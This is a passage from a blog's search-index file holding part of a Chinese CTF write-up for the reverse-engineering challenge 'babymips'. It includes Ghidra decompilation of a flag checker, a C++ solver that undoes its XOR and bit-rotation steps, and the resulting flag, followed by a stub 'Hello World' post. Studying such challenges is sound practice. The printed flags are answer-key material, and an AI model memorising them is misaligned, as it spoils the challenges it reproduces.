&lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    string target = &quot;DDCTF{reverseME}&quot;;    string flag = &quot;&quot;;    for (int i = 0; i &lt; target.length(); i++) {        flag += 158 - target[i];    }    cout &lt;&lt; flag &lt;&lt; endl;}</code></pre><p>输出套上flag即可</p><pre><code>ZZ[JX#,9(9,+9QY!</code></pre><h4 id="babymips"><a href="#babymips" class="headerlink" title="babymips"></a>babymips</h4><p>这个题本身没有什么，很简单的算法，也没有什么加密、加壳，主要是有些受不了IDA+Retdec反汇编出来的代码，所以试了一下Ghidra</p><pre><code class="c++">void FUN_004009a8(void){  int iVar1;  int iStack48;  byte abStack44 [36];  setbuf(stdout,(char *)0x0);  setbuf(stdin,(char *)0x0);  printf(&quot;Give me your flag:&quot;);  scanf(&quot;%32s&quot;,abStack44);  iStack48 = 0;  while (iStack48 &lt; 0x20) {    abStack44[iStack48] = abStack44[iStack48] ^ 0x20U - (char)iStack48;    iStack48 = iStack48 + 1;  }  iVar1 = strncmp((char *)abStack44,_fdata,5);  if (iVar1 == 0) {    FUN_004007f0(abStack44);  }  else {    puts(&quot;Wrong&quot;);  }  return;}</code></pre><p>首先是输入flag，然后进行一个变换，先比较前5位，如果一致进入下一个变换</p><pre><code class="c++">void FUN_004007f0(char *param_1){  size_t sVar1;  int iVar2;  uint uStack16;  uStack16 = 5;  while (sVar1 = strlen(param_1), uStack16 &lt; sVar1) {    if ((uStack16 &amp; 1) == 0) {      param_1[uStack16] =           (byte)((uint)((int)param_1[uStack16] &lt;&lt; 0x1a) &gt;&gt; 0x18) | param_1[uStack16] &gt;&gt; 6;    }    else {      param_1[uStack16] =           param_1[uStack16] &gt;&gt; 2 | (byte)((uint)((int)param_1[uStack16] &lt;&lt; 0x1e) &gt;&gt; 0x18);    }    uStack16 = uStack16 + 1;  }  iVar2 = strncmp(param_1 + 5,PTR_DAT_00410d04,0x1b);  if (iVar2 == 0) {    puts(&quot;Right!&quot;);  }  else {    puts(&quot;Wrong!&quot;);  }  return;}</code></pre><p>后面对奇数位和偶数位进行了两个不同的位运算，很清晰，仔细分析一下会发现实际上是前后位置的一个交换，并且奇偶运算就是互为逆运算，逆向的时候更方便处理了。最后是进行简单的字符串比较，然后程序就结束了。</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    string target = &quot;Q|j{g\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&quot;;    string flag = &quot;&quot;;    for (int i = 0; i &lt; target.length(); i++) {        if(i&gt;=5)        {            int32_t tmp=target[i];            if(i%2==0)            {                tmp=((tmp&amp;0x3)&lt;&lt;6)|((tmp&amp;0xfc)&gt;&gt;2);            }            else            {                tmp=((tmp&amp;0xc0)&gt;&gt;6)|((tmp&amp;0x3f)&lt;&lt;2);            }            flag+=(tmp^(0x20-i));        }        else        {            flag+=(target[i]^(0x20-i));        }    }    cout &lt;&lt; flag &lt;&lt; endl;}</code></pre><p>需要注意的两点，运算符优先级的问题，加减运算要先于移位运算先于位运算，处理的时候需要注意，还有，移位的时候要注意把多余的位置清0，这里用的是与运算</p><p>输出flag</p><pre><code>qctf{ReA11y_4_B@89_mlp5_4_XmAn_}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2019/12/30/hello-world/"/>
    <url>/2019/12/30/hello-world/</url>
    
    <content type="html"><![CDATA[<p>My first post to say “Hello”.</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
